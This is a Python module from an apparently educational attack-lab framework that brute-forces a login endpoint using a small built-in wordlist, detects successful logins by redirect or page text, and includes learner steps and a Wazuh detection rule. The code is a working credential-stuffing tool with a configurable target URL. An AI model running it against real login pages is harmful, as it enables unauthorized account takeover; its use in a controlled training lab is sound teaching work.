"""
modules/brute_force.py — APP-06: Broken Authentication / Credential Stuffing.

Target: POST /auth/login
Vulnerability: No rate limiting, no lockout, hardcoded credentials.
"""
from __future__ import annotations

import time
from datetime import datetime, timezone

from core.base_module import BaseModule
from core.models import (
    AttackResult, Category, ModuleOption, Severity,
    StepResult, TargetConfig,
)

_USERNAMES = ["admin", "operator", "guest", "root", "user", "test"]
_PASSWORDS = [
    "password", "123456", "admin", "letmein",
    "password123", "lab2024", "guest", "wrongpass",
]

# Body indicators (checked against first 500 chars of response)
_BODY_INDICATORS = ["Welcome", "Logout", "Sign Out", "My Account"]
# URL indicators — if the final URL after redirect contains any of these, login succeeded
_URL_INDICATORS  = ["/profile/", "/dashboard/", "/home/"]


class BruteForceModule(BaseModule):
    module_id = "brute_force"
    name = "Brute Force Login"
    description = (
        "Credential stuffing attack against /auth/login. Tests a lab-internal "
        "wordlist with no rate limiting or lockout on the target."
    )
    category = Category.AUTH
    scenario_id = "APP-06"
    severity = Severity.HIGH
    # Lab metadata — consumed by /api/modules and rendered in the guided workspace.
    lab = {
        "target_path": "/auth/login",
        "vulnerable_component": "Flask login form (auth_bp.login)",
        "story": (
            "A staging authentication portal was pushed to production without "
            "rate limiting or account lockout. Your task is to prove that the "
            "endpoint is brute-forceable with a lab-internal wordlist."
        ),
        "learner_steps": [
            {"action": "Open the login page in the Lab Browser and observe the form.",
             "expected": "A styled login form with username/password fields loads."},
            {"action": "Try logging in with wrong credentials (e.g. admin / wrong).",
             "expected": "The page shows an error — notice there is no lockout or CAPTCHA."},
            {"action": "Try different username/password combinations manually.",
             "expected": "You discover distinct error messages for unknown users vs wrong passwords."},
            {"action": "Find a valid credential pair (hint: try common passwords like password123).",
             "expected": "Successful login redirects you to the profile page."},
            {"action": "Check the Evidence panel for Wazuh detections.",
             "expected": "A multiple-failed-login alert appears in the detection feed."},
        ],
        "detection_rule": "Wazuh multiple-failed-logins / authentication_failures > threshold",
        "success_markers": [
            "CREDENTIAL FOUND in the activity log",
            "HTTP 302 redirect to /profile/ on the last attempt",
            "Wazuh alert: 'Multiple authentication failures'",
        ],
        "credentials_hint": "admin:password123 is planted in the lab.",
    }
    steps = [
        {
            'title': 'Enumerate login endpoint',
            'hint': 'POST /auth/login with Content-Type: application/x-www-form-urlencoded',
            'expected': 'HTTP 401 on failure, 302 redirect on success',
            'markers': ['Attacking ', 'user(s)'],
        },
        {
            'title': 'Iterate credential wordlist',
            'hint': 'Up to 6 usernames × 8 passwords = 48 attempts',
            'expected': 'One StepResult per credential pair',
            'markers': ['Targeting:'],
        },
        {
            'title': 'Detect valid credentials',
            'hint': "Redirect to /profile/ or 'My Account' in response indicates success",
            'expected': "Evidence line 'CREDENTIAL FOUND: user:pass'",
            'markers': ['CREDENTIAL FOUND', 'No valid credentials', 'Complete —'],
        },
    ]

    def options(self) -> list[ModuleOption]:
        return [
            ModuleOption(
                name="username",
                display_name="Target Username",
                description="Single username to attack (blank = try all)",
                default="",
            ),
            ModuleOption(
                name="delay_ms",
                display_name="Delay (ms)",
                description="Milliseconds between attempts",
                default="50",
                option_type="int",
            ),
        ]

    def execute(self, target: TargetConfig, opts: dict, log_fn=None) -> AttackResult:
        started = datetime.now(timezone.utc).isoformat()
        steps: list[StepResult] = []
        found: list[str] = []

        usernames = _USERNAMES
        single = opts.get("username", "").strip()
        if single:
            usernames = [single]

        delay = int(opts.get("delay_ms", 50)) / 1000.0
        endpoint = "/auth/login"
        url = target.base_url + endpoint

        self._log(log_fn, f"Attacking {len(usernames)} user(s) × {len(_PASSWORDS)} passwords")

        for username in usernames:
            self._log(log_fn, f"  Targeting: {username}")
            for password in _PASSWORDS:
                r = self._post(
                    url,
                    data={"username": username, "password": password},
                    label=f"{username}:{password}",
                    timeout=target.timeout,
                )

                body = r.detail or ""
                final_url = r.url or ""
                # Prefer URL check (reliable) — body check is secondary for non-redirect targets
                hit = (
                    any(ind in final_url for ind in _URL_INDICATORS)
                    or any(ind in body for ind in _BODY_INDICATORS)
                )
                if hit:
                    r.success = True
                    r.evidence = f"CREDENTIAL FOUND: {username}:{password}"
                    found.append(f"{username}:{password}")
                    self._log(log_fn, f"[+] CREDENTIAL FOUND: {username}:{password} -> {final_url}")
                    steps.append(r)
                    break
                else:
                    r.success = False
                    steps.append(r)

                if delay > 0:
                    time.sleep(delay)

        if found:
            summary = f"Found {len(found)} valid credential(s): {', '.join(found)}"
        else:
            summary = "No valid credentials found in wordlist."

        return self._make_result(target, steps, summary, started)
